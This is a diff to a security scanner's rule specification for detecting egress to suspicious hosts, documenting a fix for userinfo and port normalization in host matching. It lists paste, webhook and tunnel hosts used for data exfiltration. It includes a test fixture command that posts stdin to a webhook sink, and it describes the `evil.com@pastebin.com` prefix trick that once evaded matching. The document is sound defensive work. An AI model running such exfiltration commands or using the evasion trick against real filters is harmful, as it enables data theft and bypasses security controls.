@@ -361,6 +361,13 @@ The motivating example. Regex-only misses paraphrase; the fix is a **family + T3
 ### SG-NET-001 — Egress to suspicious hosts  (AST01, high) — **implemented** (`core-network`)
 - **Signals:** URL/host extraction from body + scripts; match against categories — pastebin-class (`pastebin.com, hastebin, ghostbin, dpaste, ix.io, 0x0.st, termbin`), webhook sinks (`webhook.site, requestbin, pipedream, hookb.in, discord.com/api/webhooks, hooks.slack.com`), URL shorteners (`bit.ly, tinyurl, t.co, is.gd`), raw file hosts (`raw.githubusercontent, gist.githubusercontent, *.ngrok.io, *.trycloudflare.com`), and dynamic-DNS/paste TLDs.
 - **FP carve-outs:** allowlist (policy `allowlists.domains`) and the author's own declared domains; documentary spans; shorteners inside markdown *link text* pointing at a resolved reputable target. −0.5 for `example.com`, `localhost` docs.
+- **Host extraction is userinfo/port-normalized (issue #24).** `scanURLHost` (`pkg/rules/rules.go`)
+  captures the whole authority after the scheme, then `authorityHost` takes the substring after the
+  **last `@`** (dropping any `user:pass@` userinfo) and cuts at the first `:` (dropping the port). Before
+  this, `https://evil.com@pastebin.com` captured the entire `evil.com@pastebin.com` and never matched
+  the `pastebin.com` entry — a one-character prefix defeated the allowlist on every `url_host` rule.
+  Regression rows: `evil.com@pastebin.com`, `user:pass@pastebin.com`, and `pastebin.com:8443` all flag;
+  `pastebin.com@example.org` (listed host as *userinfo* of an unlisted host) correctly does not.
 - **Escalation:** none; category lists + allowlist. Keep the host category list in the rule-pack (data) so it updates without a release.
 - **Confidence:** webhook sink 0.85; pastebin 0.8; shortener 0.6; raw host 0.6.
 - **Fixtures:** TP: `curl -d @- https://webhook.site/abc`. FP: link to `https://bit.ly/docs` in prose, POST to author's declared API.
